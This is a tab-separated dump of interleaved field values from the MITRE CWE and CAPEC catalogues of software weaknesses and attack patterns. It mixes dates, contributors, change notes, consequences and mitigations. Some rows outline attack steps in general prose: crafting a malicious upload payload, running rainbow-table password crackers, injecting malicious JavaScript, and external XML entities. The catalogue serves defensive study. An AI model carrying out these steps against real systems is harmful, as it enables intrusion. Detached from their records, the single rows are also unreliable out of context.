10557	101	CAPEC Content Team
14899	101	CAPEC Content Team
20404	62	updated Potential_Mitigations, Time_of_Introduction
20337	62	updated Relationships
18548	73	Access unprotected functions and execute them.
10419	35	MITRE
6592	74	4
16224	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships
23729	39	2012-05-11
16060	76	2019-04-04
14183	81	Access Control
14513	85	233
10551	23	Software that does not appropriately monitor or control resource consumption can lead to adverse system performance.
23431	62	updated Common_Consequences
7954	44	SOAR Partial
8959	45	Variant
10448	62	updated Relationships
21664	24	MITRE
12475	28	CWE Content Team
9272	35	MITRE
11119	62	updated Potential_Mitigations
15435	56	ChildOf
8647	100	The MITRE Corporation
15046	28	CWE Content Team
5888	35	MITRE
9668	28	CWE Content Team
23647	39	2009-05-27
7673	39	2008-10-14
16984	35	MITRE
22978	44	Moderate
14678	81	Confidentiality
23335	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
6234	100	The MITRE Corporation
10914	63	Execute Unauthorized Code or Commands
10792	62	updated Time_of_Introduction
6933	86	http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html
7209	101	CAPEC Content Team
9554	39	2014-07-30
22906	81	Confidentiality
17950	103	Primary
18092	39	2012-10-30
6109	39	2014-07-30
9029	81	Confidentiality
11865	51	2014-06-23
21636	101	CAPEC Content Team
10244	101	CAPEC Content Team
19659	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
15520	31	1000
13179	35	MITRE
22638	101	CAPEC Content Team
11687	62	updated Related_Attack_Patterns, Relationships
19806	42	Choose a language that provides automatic memory management.
18453	90	C++
19406	39	2009-07-27
8599	91	Architecture and Design
23063	28	CWE Content Team
20909	39	2010-02-16
15150	79	Authorization
10949	27	Capability to directly or indirectly modify registry resources
6911	101	CAPEC Content Team
14823	67	High
8303	23	The software does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the software.
20665	39	2008-07-01
6786	56	ChildOf
18784	39	2018-03-27
6821	63	Quality Degradation
18600	89	Detailed
8357	55	CAPEC Content Team
7896	62	updated Relationships
7489	62	updated Description
17484	28	CWE Content Team
14404	66	Smashing The Stack For Fun And Profit
21475	62	updated Detection_Factors, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
9898	62	updated Modes_of_Introduction, Other_Notes, Potential_Mitigations
20262	102	ChildOf
6056	63	Read Memory
6942	39	2011-06-27
9571	104	72
10055	28	CWE Content Team
8123	97	Upload a Web Shell to a Web Server
20471	80	Exploiting a poorly protected identity token is a well understood attack with many helpful resources available.
24341	62	updated Relationships
9523	85	22
5835	35	MITRE
11841	39	2014-07-30
18667	81	Confidentiality
24675	35	MITRE
8284	91	Implementation
12496	35	MITRE
22495	69	Incomplete
11172	78	High
20400	71	2010
14915	31	1003
14748	103	Primary
7002	39	2008-07-01
6345	56	ChildOf
11843	91	Operation
19773	31	699
19946	62	updated Relationships
12403	97	Probe Audio and Video Peripherals
21995	28	CWE Content Team
24420	28	CWE Content Team
5872	35	MITRE
15607	39	2008-07-01
23556	39	2014-06-23
19127	95	The attacker intentionally feeds malicious data to the client to exploit the buffer overflow vulnerability that she has uncovered.
14432	35	MITRE
19100	35	MITRE
24327	56	ChildOf
15850	23	The software does not return custom error pages to the user, possibly exposing sensitive information.
10590	23	An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the "Exploitation of Session Variables, Resource IDs and other Trusted Credentials" attack patterns.
12746	28	CWE Content Team
21029	47	Gain Privileges
5636	79	Confidentiality
13270	62	updated Relationships
17391	42	Use expressions such as "sizeof(*pointer)" instead of "sizeof(pointer)", unless you intend to run sizeof() on a pointer type to gain some platform independence or if you are allocating a variable on the stack.
15610	90	Language-Independent
9524	39	2014-06-23
24212	39	2008-07-01
14862	35	MITRE
15907	39	2011-06-01
11739	39	2018-03-27
23189	31	1000
11972	81	Integrity
12233	50	Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise.
19749	45	Variant
20126	91	Implementation
11413	79	Confidentiality
10255	56	ChildOf
13053	59	Updated Related_Attack_Patterns
23486	62	updated Common_Consequences
22943	91	Implementation
25132	74	3
18587	104	88
11045	28	CWE Content Team
11263	39	2015-12-07
18116	101	CAPEC Content Team
13271	48	09
9474	39	2011-06-01
8319	21	PLOVER
16991	81	Access Control
7644	35	MITRE
7835	28	CWE Content Team
14770	35	MITRE
23717	54	High
7896	28	CWE Content Team
21040	39	2010-12-13
22499	35	MITRE
8331	21	PLOVER
22397	76	2015-11-09
8113	77	Dynamic Analysis with Automated Results Interpretation
19171	39	2011-06-01
7771	56	ChildOf
14267	39	2009-07-17
23641	35	MITRE
6845	105	Mobile
9255	63	Gain Privileges or Assume Identity
20601	35	MITRE
14042	56	ChildOf
14445	89	Standard
5970	85	558
18336	59	Updated Related_Attack_Patterns
17411	33	Davide Marrone
8716	28	CWE Content Team
20842	40	The target host uses session IDs to keep track of the users.
13620	39	2012-05-11
6912	61	Draft
25429	28	CWE Content Team
7018	53	The MITRE Corporation
11917	62	updated Demonstrative_Examples
20496	62	updated Type
10481	76	2017-08-04
14262	93	Defense in Depth
16168	35	MITRE
24935	104	1115
9338	39	2012-05-11
13165	35	MITRE
13746	35	MITRE
20268	62	updated Relationships, Taxonomy_Mappings
8806	63	Gain Privileges or Assume Identity
21253	50	This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.
14362	81	Availability
17331	53	The MITRE Corporation
23472	62	updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings
24269	28	CWE Content Team
18935	28	CWE Content Team
14599	66	PHP unserialization vulnerabilities: What are we missing?
13009	39	2010-04-05
22761	31	699
7393	90	PHP
8418	104	343
23773	47	Other
14807	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
23745	92	Exploit
17216	28	CWE Content Team
16893	59	Updated Description, Description Summary, Examples-Instances, Related_Weaknesses
13435	28	CWE Content Team
6994	28	CWE Content Team
7497	91	Implementation
22667	62	updated Potential_Mitigations
23102	39	2011-06-01
19484	28	CWE Content Team
24392	40	The adversary has the ability to modify the resource.
17687	91	Implementation
21512	63	Execute Unauthorized Code or Commands
6444	28	CWE Content Team
24952	63	Other
19800	55	CAPEC Content Team
16264	24	Purdue University
17754	40	The targeted system must attempt to filter access based on the HTTP verb used in requests.
6921	81	Integrity
14287	91	Implementation
11302	93	Limited
20944	59	Updated Solutions_and_Mitigations
5665	21	PLOVER
19775	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
17059	42	Utilize an appropriate mix of whitelist and blacklist parsing to filter equivalent special element syntax from all input.
17270	39	2014-07-30
22675	91	Implementation
6032	62	updated Relationships
13784	62	updated Relationships, Taxonomy_Mappings
20598	28	CWE Content Team
9681	31	699
23001	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.
21330	26	Operation
23082	39	2008-09-08
23835	62	updated Relationships, Taxonomy_Mappings
18157	35	MITRE
12186	28	CWE Content Team
17087	103	Primary
8914	59	Updated References
11893	62	updated Description, Other_Notes, Research_Gaps, Terminology_Notes
25209	39	2017-11-08
25196	88	Incorrect Resource Transfer Between Spheres
10676	62	updated Potential_Mitigations
7096	62	updated Relationships
21642	45	Base
24340	100	The MITRE Corporation
7371	101	CAPEC Content Team
19995	35	MITRE
20270	62	updated Relationships
10220	39	2012-05-11
11590	35	MITRE
19802	43	Simple
23093	42	Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files.
22378	48	03
8141	35	MITRE
12004	26	Implementation
22506	32	Verisign, Inc.
10806	81	Availability
16908	76	2018-07-31
17441	28	CWE Content Team
13608	28	CWE Content Team
10226	39	2011-09-13
7630	35	MITRE
23934	78	Medium
8121	78	Low
21387	28	CWE Content Team
6547	51	2015-11-09
22797	39	2015-12-07
21661	49	2005
24948	76	2017-05-01
8909	42	Before acting on the Intent, check the Intent Action to make sure it matches the expected System action.
22893	39	2017-11-08
24471	28	CWE Content Team
24751	35	MITRE
8396	62	updated Description, Name, Relationships
23248	50	To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An 'explicit intent' is delivered to a specific application as declared within the intent, whereas an 'implicit intent' is directed to an application as defined by the Android operating system. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly (i.e., with appropriate security controls).
24651	49	2012
22436	79	Access Control
8735	47	Bypass Protection Mechanism
21032	100	The MITRE Corporation
13650	39	2009-05-27
19925	53	The MITRE Corporation
15460	23	In this attack scenario, the attacker actively transmits signals to overpower and disrupt the communication between a cellular user device and a cell tower. Several existing techniques are known in the open literature for this attack for 2G, 3G, and 4G LTE cellular technology. For example, some attacks target cell towers by overwhelming them with false status messages, while others introduce high levels of noise on signaling channels.
21770	31	699
10667	35	MITRE
24791	31	1000
9064	36	http://www.xml.org/xml/news/archives/archive.11292006.shtml
14309	35	MITRE
15138	47	Resource Consumption
24510	31	1000
19107	53	The MITRE Corporation
12808	35	Cigital
23550	73	Examine URL to see if any opaque tokens are in it
20112	91	Architecture and Design
9732	23	The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.
16998	62	updated Relationships
5843	43	Simple
23067	35	MITRE
7542	61	Draft
17528	45	Base
12114	74	3
7303	101	CAPEC Content Team
17490	28	CWE Content Team
14424	101	CAPEC Content Team
18084	71	2010
19429	62	updated Potential_Mitigations, Time_of_Introduction
18532	90	JavaScript
18643	28	CWE Content Team
13484	88	Use of a One-Way Hash with a Predictable Salt
23915	23	An attacker creates an XML document that contains an external entity reference. External entity references can take the form of <!ENTITY name system "uri"> tags in a DTD. Because processors may not validate documents with external entities, there may be no checks on the nature of the reference in the external entity. This can allow an attacker to open arbitrary files or connections.
23698	39	2010-06-21
9949	62	updated Common_Consequences
25350	25	Low
6887	31	1000
22368	39	2017-11-08
11443	74	1
10858	69	Incomplete
16163	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.
11355	59	Updated Related_Attack_Patterns
15745	23	An attacker implants malicious software into the system in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.
22614	91	Architecture and Design
7621	81	Other
19405	63	DoS: Resource Consumption (Other)
14403	76	2019-04-04
18800	26	Implementation
19038	23	The code has a parent class that contains references to a child class, its methods, or its members.
23726	103	Primary
23881	46	This can allow an attacker to forge log entries or inject malicious content into logs.             Log forging vulnerabilities occur when:                                                Data enters an application from an untrusted source.                   The data is written to an application or system log file.
24841	45	Base
20207	39	2017-11-08
17468	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
14009	42	Ensure that any data type casting that you must used is entirely understood in order to reduce the plausibility of error in use.
9651	59	Updated Related_Weaknesses
12258	62	updated Potential_Mitigations
25016	24	MITRE
8476	35	MITRE
8653	60	27
9595	26	Implementation
19891	23	The code is compiled without sufficient warnings enabled, which      may prevent the detection of subtle bugs or quality      issues.
15568	39	2011-06-27
13500	28	CWE Content Team
17736	80	To use distributed network to launch the attack
19984	35	MITRE
20129	35	MITRE
6070	73	Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.
12202	78	Low
23352	62	updated Time_of_Introduction
12908	39	2017-11-08
14117	39	2014-07-30
23235	21	PLOVER
12286	79	Access Control
7886	91	Implementation
21569	27	Technology or vendor specific list of default usernames and passwords.
18258	28	CWE Content Team
15555	35	MITRE
12916	21	7 Pernicious Kingdoms
8402	35	MITRE
24649	28	CWE Content Team
10696	89	Standard
24925	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
9353	47	Modify Data
22794	39	2018-03-27
13269	28	CWE Content Team
5810	39	2009-07-08
18268	35	MITRE
10439	35	MITRE
10052	102	ChildOf
22016	100	The MITRE Corporation
9641	39	2010-12-13
14421	35	MITRE
18683	66	8 Basic Rules to Implement Secure File Uploads
11857	74	4
7087	39	2019-06-20
16944	31	1000
23931	81	Integrity
21874	28	CWE Content Team
10621	101	CAPEC Content Team
14829	60	26
21383	35	MITRE
16195	39	2010-02-16
21803	56	ChildOf
7861	69	Incomplete
17463	31	699
20079	56	ChildOf
16168	39	2011-03-29
5619	62	updated Relationships, Taxonomy_Mappings
7219	62	updated Applicable_Platforms, Time_of_Introduction
18657	62	updated Likelihood_of_Exploit, Relationships, Taxonomy_Mappings
13101	35	MITRE
12743	39	2009-10-29
7018	55	CAPEC Content Team
11834	31	1000
16923	39	2010-12-13
12546	35	MITRE
12565	81	Other
14472	39	2019-01-03
5604	39	2008-09-08
21882	95	[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.
5962	81	Integrity
24151	103	Primary
16575	35	MITRE
8529	69	Incomplete
15834	45	Variant
22150	78	Medium
15094	56	ChildOf
7035	26	Implementation
19386	102	ChildOf
14565	62	updated Relationships
6158	39	2017-11-08
25012	89	Detailed
12657	71	2007
20291	28	CWE Content Team
13268	103	Primary
6701	39	2010-09-27
15909	47	Bypass Protection Mechanism
7089	56	PeerOf
17407	69	Draft
10330	55	CAPEC Content Team
10562	63	Modify Application Data
17216	39	2010-06-21
20417	73	Craft a malicious file payload, modify file extension to the targeted file type and submit it to the web server.
7664	89	Standard
11129	35	MITRE
19080	62	updated Relationships, Other_Notes
16885	95	[Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.
19818	54	Medium
13983	56	ChildOf
12521	28	CWE Content Team
22103	50	Use fuzz testing during the software QA process to uncover any surprises, uncover any assumptions or unexpected behavior.
9520	28	CWE Content Team
11193	69	Incomplete
14451	39	2014-07-30
8614	35	MITRE
10340	66	Testing for Path Traversal (OWASP-AZ-001)
21225	95	The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource.
13457	31	699
13312	23	The product does not properly handle null bytes or NUL characters when passing data between different representations or components.
24793	35	MITRE
7480	85	639
8834	62	updated Relationships
6638	28	CWE Content Team
10091	74	1
7223	45	Base
22268	95	The attacker inserts himself into the communication channel initially acting as a routing proxy between the two targeted components. The attacker may or may not have to use cryptography.
20448	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Forced Path Execution                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
8332	39	2013-02-21
22247	101	CAPEC Content Team
6100	95	[Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out
19667	72	If the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.
23841	93	High
13967	79	Integrity
12403	85	634
11290	103	Primary
22746	28	CWE Content Team
12260	59	Updated Related_Attack_Patterns
9242	55	CAPEC Content Team
24367	56	ChildOf
16655	28	CWE Content Team
11268	81	Access Control
20887	23	The software reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations prior to the targeted buffer.
9285	62	updated Alternate_Terms, Common_Consequences, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings
15761	79	Confidentiality
22610	53	The MITRE Corporation
6943	46	When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.
17668	56	PeerOf
12706	31	699
24997	31	1000
13699	61	Draft
14421	39	2009-05-27
18853	96	2018-07-02
7266	58	An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details.
9970	63	Reduce Maintainability
20033	62	updated Related_Attack_Patterns
8811	42	Avoid using hard-coded constants. Configuration files offer a more flexible solution.
12769	88	Operation on Resource in Wrong Phase of Lifetime
7467	69	Incomplete
6198	62	updated Description, Likelihood_of_Exploit, Other_Notes, Potential_Mitigations, Relationships
21347	39	2015-12-07
5636	79	Availability
15137	44	SOAR Partial
15646	62	updated Applicable_Platforms
18106	62	updated Relationships
17318	86	http://cseweb.ucsd.edu/~hovav/dist/crossdomain.pdf
7171	81	Other
9601	28	CWE Content Team
24387	31	1000
7819	35	MITRE
24582	95	[Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.
12443	92	Experiment
19440	21	Pascal Meunier
8250	40	The adversary must have logical access to the target network and system.
18536	39	2009-01-12
22996	28	CWE Content Team
24449	45	Base
20202	39	2011-06-01
6780	62	updated Relationships
19436	39	2012-05-11
24085	35	MITRE
15116	62	updated Applicable_Platforms, Common_Consequences, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
11457	35	MITRE
8225	81	Access Control
8790	46	Empty code blocks can occur in the bodies of conditionals, function or method definitions, exception handlers, etc.  While an empty code block might be intentional, it might also indicate incomplete implementation, accidental code deletion, unexpected macro expansion, etc.  For some programming languages and constructs, an empty block might be allowed by the syntax, but the lack of any behavior within the block might violate a convention or API in such a way that it is an error.
23837	100	The MITRE Corporation
17888	81	Integrity
5748	35	MITRE
15080	39	2011-06-27
6655	35	MITRE
11435	39	2010-09-27
6016	35	MITRE
8026	96	2018-07-02
22989	28	CWE Content Team
13671	39	2009-07-27
23036	101	CAPEC Content Team
19923	97	Using Slashes in Alternate Encoding
15673	39	2011-06-01
20475	28	CWE Content Team
13389	35	MITRE
18421	73	The attacker tries to create symlinks to the various filenames.
7628	25	Low
9884	101	CAPEC Content Team
6511	46	Software systems should warn users that a potentially dangerous action may occur if the user proceeds. For example, if the user downloads a file from an unknown source and attempts to execute the file on their machine, then the application's GUI can indicate that the file is unsafe.
10518	62	updated Relationships, Taxonomy_Mappings
13685	101	CAPEC Content Team
24112	42	Remove test code before deploying the application into production.
24234	54	High
21181	50	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
10437	35	MITRE
18471	39	2017-01-19
22634	35	Veracode
13357	39	2014-07-30
12698	103	Primary
11328	39	2008-09-08
19726	28	CWE Content Team
13057	39	2012-05-11
7635	59	Updated Related_Attack_Patterns
25163	62	updated Relationships
5896	62	updated Potential_Mitigations
14967	31	1000
12012	26	Architecture and Design
16966	103	Primary
6112	90	Language-Independent
21841	28	CWE Content Team
7321	39	2014-07-30
7284	31	699
21909	74	2
19256	101	CAPEC Content Team
7076	62	updated Detection_Factors, Relationships, Research_Gaps, Taxonomy_Mappings
10775	31	1000
7573	26	Implementation
16186	39	2010-09-27
19882	54	Low
5947	62	updated Description, Name
11607	62	updated Relationships
23817	69	Draft
11474	39	2010-06-21
13784	35	MITRE
6515	56	ChildOf
5881	28	CWE Content Team
24537	57	Indirect
23855	62	updated Relationships
14450	62	updated Relationships, Type
6391	70	OWASP Top 10
11445	35	MITRE
21722	63	Modify Files or Directories
13676	101	CAPEC Content Team
6057	81	Access Control
10302	76	2018-07-31
20601	62	updated Taxonomy_Mappings
9191	28	Eric Dalci
6126	81	Confidentiality
5654	28	CWE Content Team
8991	105	Web Based
23472	28	CWE Content Team
19986	56	ChildOf
12848	47	Read Data
17379	31	1000
24934	35	MITRE
24232	85	616
14329	28	CWE Content Team
17017	21	PLOVER
8071	39	2014-06-23
13852	35	MITRE
9136	35	MITRE
18897	39	2017-11-08
21727	31	1000
11953	28	CWE Content Team
22253	103	Primary
17689	34	This problem typically occurs when the programmer makes a typo, or copy and paste errors.
18825	28	CWE Content Team
22678	62	updated Likelihood_of_Exploit
17377	62	updated Potential_Mitigations
13742	35	MITRE
10119	79	Integrity
14280	28	CWE Content Team
23553	56	ChildOf
13513	23	The product uses a regular expression that does not sufficiently restrict the set of allowed values.
19466	39	2014-06-23
15014	39	2014-07-30
11236	45	Variant
10909	35	MITRE
11699	39	2014-07-30
19991	101	CAPEC Content Team
14629	42	Use an abstraction library to abstract away risky APIs. Not a complete solution.
19800	53	The MITRE Corporation
14067	103	Primary
14001	28	CWE Content Team
12727	33	Niyaz PK
14872	23	The adversary incites a behavior from the target by manipulating something of influence. This is commonly associated with financial, social, or ideological incentivization. Examples include monetary fraud, peer pressure, and preying on the target's morals or ethics. The most effective incentive against one target might not be as effective against another, therefore the adversary must gather information about the target's vulnerability to particular incentives.
21789	62	updated Relationships, Taxonomy_Mappings
10015	35	MITRE
16878	35	MITRE
15733	28	CWE Content Team
23484	35	MITRE
17631	81	Integrity
13055	40	The targeted applications must either expect files to be located at a specific location or, if the location of the files can be configured by the user, the user either failed to move the files from the default location or placed them in a conventional location for files of the given type.
10403	42	Do not leave debug statements that could be executed in the source code. Assure that all debug information is eradicated before releasing the software.
12059	62	updated Potential_Mitigations, Time_of_Introduction
10923	39	2014-02-18
10201	90	C++
21389	35	MITRE
11315	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
10544	96	2014-06-05
21430	39	2017-11-08
14638	100	The MITRE Corporation
20284	72	When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party.
20379	57	Primary
6860	86	http://www.tarsnap.com/scrypt.html
22523	62	updated References, Relationships, Taxonomy_Mappings
9579	56	ChildOf
8355	28	CWE Content Team
19279	35	MITRE
7207	35	MITRE
24222	28	CWE Content Team
19223	70	WASC Threat Classification 2.0
6049	95	[Cross-Site Scripting] As the adversary succeeds in exploiting the vulnerability, they can choose to attack the user with Cross-Site Scripting. The possible outcomes of such an attack are described in the Cross-Site Scripting related attack patterns.
16988	62	updated Potential_Mitigations, Time_of_Introduction
9227	43	Simple
15450	45	Variant
23225	26	Implementation
14329	62	updated Relationships, Taxonomy_Mappings
24092	103	Primary
12833	35	MITRE
17414	42	Refer to the documentation for the obsolete function in order to determine why it is deprecated or obsolete and to learn about alternative ways to achieve the same functionality.
24896	91	Implementation
12392	88	Unexpected Status Code or Return Value
10771	47	Gain Privileges
7776	76	2019-09-30
6929	43	Simple
22057	54	High
17207	28	CWE Content Team
20227	35	MITRE
17242	26	Architecture and Design
20642	28	CWE Content Team
13323	50	Refer to the RFCs to safely decode URL.
16723	56	ChildOf
21055	85	428
13667	101	CAPEC Content Team
22449	79	Confidentiality
21095	62	updated Relationships, Observed_Example, Other_Notes, References, Taxonomy_Mappings
15142	56	ChildOf
17371	28	CWE Content Team
9046	28	CWE Content Team
11867	62	updated Potential_Mitigations
12337	101	CAPEC Content Team
12733	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.
22594	35	MITRE
23272	39	2011-06-01
6694	63	Reduce Maintainability
23393	78	Very High
6717	62	updated Relationships, Taxonomy_Mappings
21914	32	The Wikimedia Foundation, Inc
20640	63	Other
8982	28	CWE Content Team
23757	62	updated Observed_Examples
17579	90	PHP
23267	56	ChildOf
13373	31	699
10341	62	updated Relationships, Taxonomy_Mappings
15381	81	Confidentiality
23950	92	Experiment
17052	62	updated Type
6373	72	Attackers can read sensitive information by accessing the unrestricted storage mechanism.
12753	45	Base
5791	28	Eric Dalci
24054	51	2017-01-03
6746	72	An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism than an attacker may be able to bypass the mechanism.
10337	51	2014-06-23
19295	28	CWE Content Team
18573	88	Improper Interaction Between Multiple Correctly-Behaving Entities
7688	31	1000
12532	46	A filter might only account for instances of special elements when they occur:                                                relative to a marker (e.g. "at the beginning/end of string; the second argument"), or                   at an absolute position (e.g. "byte number 10").                                          This may leave special elements in the data that did not match the filter position, but still may be dangerous.
19253	95	[Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.
8613	28	CWE Content Team
10060	51	2017-01-12
21705	76	2019-09-30
12719	100	The MITRE Corporation
16490	39	2012-05-11
24597	59	Updated Description Summary, Related_Attack_Patterns
16179	100	The MITRE Corporation
18244	28	CWE Content Team
9973	76	2018-07-31
24751	39	2012-10-30
14805	31	1000
21145	79	Access Control
9563	32	Microsoft Corporation
11447	46	This weakness can take several forms, such as:                                                The memory was allocated, explicitly or implicitly, via one memory management method and deallocated using a different, non-compatible function (CWE-762).                   The function calls or memory management routines chosen are appropriate, however they are used incorrectly, such as in CWE-761.
20547	56	ChildOf
17095	81	Availability
22094	23	The product does not handle or incorrectly handles input that is not syntactically well-formed with respect to the associated specification.
15804	62	updated Potential_Mitigations, Time_of_Introduction
12372	56	ChildOf
15188	73	Use modified client (modified by reverse engineering) to inject input.
19784	40	This pattern of attack requires the ability to execute a malicious application on the user's device. This malicious application is used to present the interface to the user and make the attack possible.
22322	56	ChildOf
11756	28	CWE Content Team
21110	28	CWE Content Team
24262	33	James McGlinn
7092	39	2011-06-27
16657	28	CWE Content Team
18210	45	Compound
19127	74	3
12591	79	Authorization
24537	69	Incomplete
11361	62	updated Potential_Mitigations
20151	62	updated Time_of_Introduction
6469	26	Architecture and Design
10907	35	MITRE
11698	68	Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment. This solution does not handle the use of improperly initialized variables (CWE-665).
17202	35	MITRE
16118	35	MITRE
25289	26	Implementation
17533	62	updated Potential_Mitigations
13589	39	2011-09-13
14369	39	2008-09-08
12618	62	updated Relationships
11197	39	2019-09-19
22852	39	2014-07-30
9425	28	CWE Content Team
15426	62	updated Common_Consequences
21134	85	251
17910	39	2008-07-01
19082	35	MITRE
9501	101	CAPEC Content Team
12581	35	MITRE
18674	88	UNIX Hard Link
15364	62	updated Detection_Factors
7617	39	2014-07-30
17652	99	Addison-Wesley
22822	62	updated Relationships
15693	39	2012-05-11
12734	56	CanPrecede
14285	76	2015-11-09
16938	62	updated Relationships, Taxonomy_Mappings
12544	28	CWE Content Team
7749	23	The software receives data from an upstream component, but does not filter all instances of a special element before sending it to a downstream component.
10577	33	Zhendong Su
16448	35	MITRE
14458	62	updated Demonstrative_Examples, Relationships
24869	26	Architecture and Design
15050	50	Implementation: Disallow the inclusion of DTDs as part of incoming messages.
18753	51	2014-06-23
25042	62	updated Description
16051	39	2013-07-17
15006	39	2009-01-12
14121	39	2011-06-27
10636	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Network Sniffer                            Forced Path Execution
15705	35	MITRE
16137	35	MITRE
20562	103	Primary
21971	47	Modify Data
9195	35	MITRE
6070	92	Exploit
22219	79	Authorization
15053	42	Store state information and sensitive data on the server side only.                   Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.                   If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).
22787	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19983	63	Gain Privileges or Assume Identity
16315	26	Implementation
8643	21	7 Pernicious Kingdoms
11040	47	Gain Privileges
9431	31	1003
15490	50	Implementation: Hide cookie's software information filed.
24218	84	22
16907	104	297
13722	62	updated Common_Consequences, Relationships
21189	88	Incorrect Short Circuit Evaluation
10621	59	Updated Related_Attack_Patterns
9658	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
7684	35	MITRE
22890	51	2015-11-09
17285	28	CWE Content Team
10968	39	2017-11-08
20666	28	CWE Content Team
9898	39	2009-10-29
9055	28	CWE Content Team
6950	45	Base
15593	35	MITRE
16203	62	updated Common_Consequences
19375	39	2008-07-01
14330	47	Execute Unauthorized Commands
24790	66	Usability of Security: A Case Study
5672	35	MITRE
12828	42	Remove the obsolete feature from the UI. Warn the user that the feature is no longer supported.
20529	56	ChildOf
